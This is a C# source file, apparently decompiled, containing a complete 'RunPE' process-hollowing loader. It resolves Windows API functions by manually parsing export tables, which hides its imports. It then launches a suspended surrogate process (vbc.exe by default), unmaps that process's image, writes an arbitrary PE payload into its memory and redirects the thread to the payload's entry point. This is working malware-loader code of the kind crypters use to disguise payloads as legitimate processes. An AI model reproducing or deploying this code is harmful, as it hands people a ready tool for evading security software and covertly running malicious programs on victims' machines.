using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

[SuppressUnmanagedCodeSecurity]
public class RunPE
{
    private static readonly LoadLibraryAParameters LoadLibrary = CreateApi<LoadLibraryAParameters>("kernel32", "LoadLibraryA");
    private static readonly int[] x = new int[] { 1, 0x10, 2, 0x20, 4, 0x40, 4, 0x40 };

    private static DelegateInstance CreateApi<DelegateInstance>(string name, string method) => 
        Conversions.ToGenericParameter<DelegateInstance>(Marshal.GetDelegateForFunctionPointer((IntPtr) GetProcAddress((long) GetInternalModuleBaseAddr(name), method), typeof(DelegateInstance)));

    private static IntPtr GetInternalModuleBaseAddr(string ModuleName)
    {
        IEnumerator enumerator;
        if (!ModuleName.Contains(".dll"))
        {
            ModuleName = ModuleName + ".dll";
        }
        IntPtr ptr2 = new IntPtr();
        try
        {
            enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ProcessModule current = (ProcessModule) enumerator.Current;
                if (current.ModuleName.ToLower() == ModuleName)
                {
                    return current.BaseAddress;
                }
            }
        }
        finally
        {
            if (enumerator is IDisposable)
            {
                (enumerator as IDisposable).Dispose();
            }
        }
        return LoadLibrary(ModuleName);
    }

    private static long GetProcAddress(long ModuleAddress, string Export)
    {
        byte[] buffer = null;
        if (IntPtr.Size == 4)
        {
            buffer = ReadByteArray((IntPtr) ((ModuleAddress + Marshal.ReadInt32((IntPtr) ((ModuleAddress + Marshal.ReadInt32((IntPtr) (ModuleAddress + 60L))) + 120L))) + 0x18L), 0x10);
        }
        if (IntPtr.Size == 8)
        {
            buffer = ReadByteArray((IntPtr) ((ModuleAddress + Marshal.ReadInt32((IntPtr) ((ModuleAddress + Marshal.ReadInt32((IntPtr) (ModuleAddress + 60L))) + 0x88L))) + 0x18L), 0x10);
        }
        int num5 = BitConverter.ToInt32(buffer, 0);
        for (int i = 0; i <= num5; i++)
        {
            int num4 = Marshal.ReadInt32((IntPtr) ((BitConverter.ToInt32(buffer, 8) + ModuleAddress) + (i * 4)));
            string str = Encoding.ASCII.GetString(ReadByteArray((IntPtr) (ModuleAddress + num4), 0x40)).Split(new char[] { '\0' })[0];
            int num3 = BitConverter.ToInt16(ReadByteArray((IntPtr) ((BitConverter.ToInt32(buffer, 12) + ModuleAddress) + (i * 2)), 2), 0);
            if (str == Export)
            {
                return (BitConverter.ToInt32(ReadByteArray((IntPtr) ((BitConverter.ToInt32(buffer, 4) + ModuleAddress) + (num3 * 4)), 4), 0) + ModuleAddress);
            }
        }
        return 0L;
    }

    private static byte[] ReadByteArray(IntPtr Address, int Size)
    {
        byte[] destination = new byte[(Size - 1) + 1];
        Marshal.Copy(Address, destination, 0, Size);
        return destination;
    }

    public static void Run(byte[] bytes, string surrogateProcess)
    {
        IntPtr ptr5;
        if (surrogateProcess == null)
        {
            surrogateProcess = RuntimeEnvironment.GetRuntimeDirectory() + "vbc.exe";
        }
        CP cp = CreateApi<CP>("kernel32", "CreateProcessA");
        GTC gtc = CreateApi<GTC>("kernel32", "GetThreadContext");
        NTU ntu = CreateApi<NTU>("ntdll", "NtUnmapViewOfSection");
        RPM rpm = CreateApi<RPM>("kernel32", "ReadProcessMemory");
        RT rt = CreateApi<RT>("kernel32", "ResumeThread");
        STC stc = CreateApi<STC>("kernel32", "SetThreadContext");
        VAE vae = CreateApi<VAE>("kernel32", "VirtualAllocEx");
        VPE vpe = CreateApi<VPE>("kernel32", "VirtualProtectEx");
        WPM wpm = CreateApi<WPM>("kernel32", "WriteProcessMemory");
        int num3 = BitConverter.ToInt32(bytes, 60);
        int num2 = BitConverter.ToInt16(bytes, num3 + 6);
        IntPtr size = new IntPtr(BitConverter.ToInt32(bytes, num3 + 0x54));
        byte[] sInfo = new byte[0x44];
        IntPtr[] pInfo = new IntPtr[4];
        if (cp(null, new StringBuilder(surrogateProcess), ptr5, ptr5, false, 4, ptr5, null, sInfo, pInfo))
        {
            uint[] ctxt = new uint[0xb3];
            ctxt[0] = 0x10002;
            if (gtc(pInfo[1], ctxt))
            {
                IntPtr ptr;
                IntPtr ptr3;
                IntPtr baseAddr = new IntPtr(ctxt[0x29] + 8L);
                IntPtr bufrSize = new IntPtr(4);
                if (rpm(pInfo[0], baseAddr, ref ptr, bufrSize, ref ptr3) && (ntu(pInfo[0], ptr) == 0L))
                {
                    IntPtr addr = new IntPtr(BitConverter.ToInt32(bytes, num3 + 0x34));
                    IntPtr ptr9 = new IntPtr(BitConverter.ToInt32(bytes, num3 + 80));
                    IntPtr ptr2 = vae(pInfo[0], addr, ptr9, 0x3000, 0x40);
                    bool flag = wpm(pInfo[0], ptr2, bytes, size, ref ptr3);
                    int num5 = num2 - 1;
                    for (int i = 0; i <= num5; i++)
                    {
                        int num;
                        int[] dst = new int[10];
                        Buffer.BlockCopy(bytes, (num3 + 0xf8) + (i * 40), dst, 0, 40);
                        byte[] buffer2 = new byte[(dst[4] - 1) + 1];
                        Buffer.BlockCopy(bytes, dst[5], buffer2, 0, buffer2.Length);
                        ptr9 = new IntPtr(ptr2.ToInt32() + dst[3]);
                        addr = new IntPtr(buffer2.Length);
                        flag = wpm(pInfo[0], ptr9, buffer2, addr, ref ptr3);
                        ptr9 = new IntPtr(ptr2.ToInt32() + dst[3]);
                        addr = new IntPtr(dst[2]);
                        flag = vpe(pInfo[0], ptr9, addr, x[(dst[9] >> 0x1d) & 7], ref num);
                    }
                    ptr9 = new IntPtr(ctxt[0x29] + 8L);
                    addr = new IntPtr(4);
                    flag = wpm(pInfo[0], ptr9, BitConverter.GetBytes(ptr2.ToInt32()), addr, ref ptr3);
                    ctxt[0x2c] = (uint) (ptr2.ToInt32() + BitConverter.ToInt32(bytes, num3 + 40));
                    stc(pInfo[1], ctxt);
                }
            }
            rt(pInfo[1]);
        }
    }

    private delegate bool CP(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);

    private delegate bool GTC(IntPtr hThr, uint[] ctxt);

    private delegate IntPtr LoadLibraryAParameters(string name);

    private delegate uint NTU(IntPtr hProc, IntPtr baseAddr);

    private delegate bool RPM(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, IntPtr bufrSize, ref IntPtr numRead);

    private delegate int RT(IntPtr hThr);

    private delegate bool STC(IntPtr hThr, uint[] ctxt);

    private delegate IntPtr VAE(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);

    private delegate bool VPE(IntPtr hProc, IntPtr addr, IntPtr size, int newProt, ref int oldProt);

    private delegate bool WPM(IntPtr hProc, IntPtr baseAddr, byte[] buff, IntPtr size, ref IntPtr numRead);
}

